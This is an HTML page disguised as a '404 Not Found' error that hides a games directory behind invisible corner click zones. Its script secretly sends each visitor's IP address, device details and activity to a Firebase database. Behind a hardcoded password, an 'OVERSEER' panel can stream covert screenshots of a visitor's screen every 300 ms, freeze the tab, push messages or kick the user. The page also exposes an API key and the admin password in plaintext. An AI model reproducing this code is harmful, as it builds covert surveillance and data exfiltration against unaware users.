<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://ipapi.co/json/"></script>
    <style>
        :root { --primary: #00ff41; --bg: #000; --card: #111; --fav: #ff4757; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        
        /* GHOST CORNERS - REINFORCED FOR GITHUB */
        #ghostAdmin { position: fixed; top: 0; left: 0; width: 80px; height: 80px; z-index: 9999999; background: rgba(0,0,0,0.01); }
        #ghostPleb { position: fixed; top: 0; right: 0; width: 80px; height: 80px; z-index: 9999999; background: rgba(0,0,0,0.01); }

        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        #loginOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1500000; display: none; align-items: center; justify-content: center; }
        #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
        
        .nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: #080808; border-bottom: 1px solid #222; }
        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
        
        .card { background: var(--card); border: 1px solid #222; padding: 35px 15px; text-align: center; cursor: pointer; border-radius: 8px; color: var(--primary); position: relative; transition: 0.2s ease; }
        .card:hover { border-color: var(--primary); transform: translateY(-3px); }
        
        /* FAVORITE HEART - TRIPLE CHECKED */
        .fav-area { position: absolute; top: 0; right: 0; width: 50px; height: 50px; display: flex; align-items: center; justify-content: center; z-index: 100; cursor: pointer; }
        .fav-btn { color: #222; font-size: 24px; transition: 0.2s; pointer-events: none; user-select: none; }
        .fav-btn.active { color: var(--fav); text-shadow: 0 0 10px var(--fav); }

        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0a0a0a; border: 1px solid #333; padding: 25px; z-index: 4000000; width: 95%; max-width: 1100px; border-radius: 12px; color: #fff; box-shadow: 0 0 50px #000; }
        .admin-layout { display: flex; gap: 15px; height: 500px; }
        .u-sidebar { width: 220px; border: 1px solid #333; overflow-y: auto; background: #050505; }
        .u-item { padding: 12px; border-bottom: 1px solid #222; cursor: pointer; font-size: 11px; transition: 0.2s; }
        .u-item:hover { background: #111; }
        .u-item.selected { border-left: 5px solid var(--primary); background: #0a1a0a; }
        
        .info-box { font-size: 11px; background: #000; padding: 15px; border: 1px solid #333; color: #fff; height: 220px; white-space: pre-wrap; overflow-y: auto; }
        .btn { background: var(--primary); color: #000; border: none; padding: 10px; cursor: pointer; font-weight: bold; border-radius: 4px; font-size: 11px; transition: 0.2s; }
        .btn:active { transform: scale(0.95); }
        .input { background: #000; border: 1px solid #444; color: var(--primary); padding: 8px; margin: 5px 0; width: 100%; box-sizing: border-box; outline: none; }
    </style>
</head>
<body tabindex="0">

    <div id="ghostAdmin" onclick="door('admin')"></div>
    <div id="ghostPleb" onclick="door('pleb')"></div>

    <div id="lockdown">
        <h1 style="font-size: 50px; margin-bottom: 0;">404</h1>
        <p style="font-size: 18px;">The requested URL was not found on this server.</p>
    </div>

    <div id="loginOverlay">
        <div style="text-align:center; width: 300px; background:#0a0a0a; padding:40px; border:1px solid #333; border-radius: 12px;">
            <h2 style="color:var(--primary); margin-top:0;">SYSTEM LOGIN</h2>
            <input type="text" id="username" class="input" placeholder="Credential Identity...">
            <button class="btn" style="width:100%; margin-top:15px;" onclick="initSession()">ACCESS</button>
        </div>
    </div>

    <div id="app">
        <div class="nav">
            <div><b>BRAVO_V46</b> <span id="badge" style="color:var(--primary);"></span></div>
            <div style="display:flex; gap:10px; flex-grow:1; max-width:450px;">
                <select id="cat" class="input" style="width:130px; margin:0;" onchange="renderGrid()">
                    <option value="all">DIRECTORY</option>
                    <option value="favs">FAVORITES</option>
                </select>
                <input type="text" id="search" class="input" style="margin:0;" placeholder="Search files..." oninput="renderGrid()">
            </div>
            <button id="adminBtn" class="btn" style="display:none;" onclick="toggleModal('adminM')">OVERSEER</button>
        </div>
        <div id="grid" class="game-grid"></div>
    </div>

    <div id="adminM" class="modal">
        <h3 style="margin-top:0; color:var(--primary); letter-spacing: 2px;">OVERSEER TERMINAL</h3>
        <div class="admin-layout">
            <div id="userList" class="u-sidebar"></div>
            <div style="flex-grow:1; display:flex; flex-direction:column; gap:10px;">
                <div style="display:flex; gap:10px;">
                    <div id="dossier" class="info-box" style="flex:1;">Scanning for targets...</div>
                    <div id="preview" style="width:320px; height:220px; border:1px solid #333; background:#000 center/contain no-repeat;"></div>
                </div>
                <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:10px;">
                    <button class="btn" onclick="adminAct('stream')">TOGGLE STREAM</button>
                    <button class="btn" onclick="adminAct('frozen')">FREEZE TAB</button>
                    <button class="btn" onclick="adminCustom('notice')">PUSH MESSAGE</button>
                    <button class="btn" style="background:red; color:white;" onclick="removeUser()">TERMINATE</button>
                </div>
                <input type="text" id="adminCmd" class="input" placeholder="Message or Command string...">
            </div>
        </div>
        <button class="btn" style="width:100%; margin-top:15px; background:#222; color:#fff;" onclick="toggleModal('adminM')">MINIMIZE</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
        const firebaseApp = initializeApp(firebaseConfig);
        const db = getDatabase(firebaseApp);

        let userRef, myID, selectedID, isAdmin = false, gameData = [], streamInt;
        let favs = JSON.parse(localStorage.getItem('favs') || '[]');

        window.door = (t) => {
            if(t === 'admin') {
                if(prompt("ROOT_PASS:") === "MONGLE_OWNER_99") { 
                    isAdmin = true; 
                    document.getElementById('adminBtn').style.display="block"; 
                    document.getElementById('badge').innerText="[ADMIN]";
                } else return;
            }
            document.getElementById('loginOverlay').style.display='flex';
        };

        window.initSession = async () => {
            const name = document.getElementById('username').value || "User_" + Math.floor(Math.random()*9999);
            document.getElementById('lockdown').style.display="none"; 
            document.getElementById('loginOverlay').style.display="none"; 
            document.getElementById('app').style.display="flex";

            let ipData = {ip: '?'}; try { ipData = await (await fetch('https://ipapi.co/json/')).json(); } catch(e){}
            
            userRef = push(ref(db, 'presence'), {
                name, ip: ipData.ip || '?', activity: 'In Menu', 
                ram: navigator.deviceMemory || '?', cpu: navigator.hardwareConcurrency || '?', lang: navigator.language,
                joined: new Date().toLocaleTimeString()
            });
            myID = userRef.key;
            onDisconnect(userRef).remove();

            onValue(ref(db, `presence/${myID}`), (s) => {
                const d = s.val(); if(!d) return;
                if(d.kicked) { remove(ref(db, `presence/${myID}`)); window.location.replace("about:blank"); }
                if(d.notice) { alert(d.notice); update(userRef, {notice: null}); }
                if(d.stream && !streamInt) streamInt = setInterval(capture, 300);
                if(!d.stream && streamInt) { clearInterval(streamInt); streamInt = null; }
            });

            const res = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
            gameData = (await res.json()).filter(f => f.name.endsWith('.html') && f.name !== 'index.html');
            renderGrid();
            if(isAdmin) startOverseer();
        };

        async function capture() {
            try {
                const canvas = await html2canvas(document.body, {scale: 0.2, useCORS: true, allowTaint: true});
                update(userRef, {lastCap: canvas.toDataURL("image/webp", 0.1)});
            } catch(e) {}
        }

        window.renderGrid = () => {
            const q = document.getElementById('search').value.toLowerCase();
            const filter = document.getElementById('cat').value;
            const grid = document.getElementById('grid'); 
            grid.innerHTML = "";
            
            gameData.filter(g => g.name.toLowerCase().includes(q)).forEach(g => {
                const isFav = favs.includes(g.name);
                if(filter === 'favs' && !isFav) return;
                
                const card = document.createElement('div'); 
                card.className = "card";
                card.innerHTML = `
                    <div class="fav-area" onclick="toggleFav(event,'${g.name}')">
                        <span class="fav-btn ${isFav?'active':''}">‚ù§</span>
                    </div>
                    ${g.name.replace('.html','').toUpperCase()}
                `;
                
                card.onclick = (e) => { 
                    if(!e.target.closest('.fav-area')) {
                        update(userRef, {activity: 'Playing ' + g.name});
                        window.open(`https://raw.githack.com/bob154526-hue/Mongle/main/${g.name}`);
                    }
                };
                grid.appendChild(card);
            });
        };

        window.toggleFav = (e, name) => {
            e.preventDefault(); e.stopPropagation();
            if(favs.includes(name)) favs = favs.filter(f => f !== name);
            else favs.push(name);
            localStorage.setItem('favs', JSON.stringify(favs));
            renderGrid();
        };

        function startOverseer() {
            onValue(ref(db, 'presence'), (snap) => {
                const list = document.getElementById('userList'); 
                list.innerHTML = "";
                snap.forEach(c => {
                    const u = c.val();
                    const d = document.createElement('div'); 
                    d.className = `u-item ${selectedID === c.key ? 'selected' : ''}`;
                    d.innerHTML = `<b>${u.name}</b><br>${u.activity}`;
                    d.onclick = () => { selectedID = c.key; showDossier(u); };
                    list.appendChild(d);
                });
            });
        }

        function showDossier(u) {
            document.getElementById('dossier').innerText = `IDENT: ${u.name}\nIP: ${u.ip}\nRAM: ${u.ram}GB\nCPU: ${u.cpu} Cores\nACTIVITY: ${u.activity}\nJOINED: ${u.joined}`;
            document.getElementById('preview').style.backgroundImage = `url(${u.lastCap || ''})`;
        }

        window.removeUser = () => { if(selectedID) { update(ref(db, `presence/${selectedID}`), {kicked: true}); selectedID = null; } };
        window.adminAct = (t) => { if(selectedID) onValue(ref(db, `presence/${selectedID}/${t}`), (s) => update(ref(db, `presence/${selectedID}`), {[t]: !s.val()}), {onlyOnce:true}); };
        window.adminCustom = (t) => { if(selectedID) update(ref(db, `presence/${selectedID}`), {[t]: document.getElementById('adminCmd').value}); };
        window.toggleModal = (id) => { const m = document.getElementById(id); m.style.display = m.style.display === 'block' ? 'none' : 'block'; };

        document.addEventListener('keydown', (e) => {
            if(e.shiftKey && e.code === 'KeyL') door('pleb');
        });

        // RE-VERIFY MENU STATUS ON TAB RETURN
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && userRef && !selectedID) {
                update(userRef, {activity: 'In Menu'});
            }
        });

        got it
    </script>
</body>
</html>
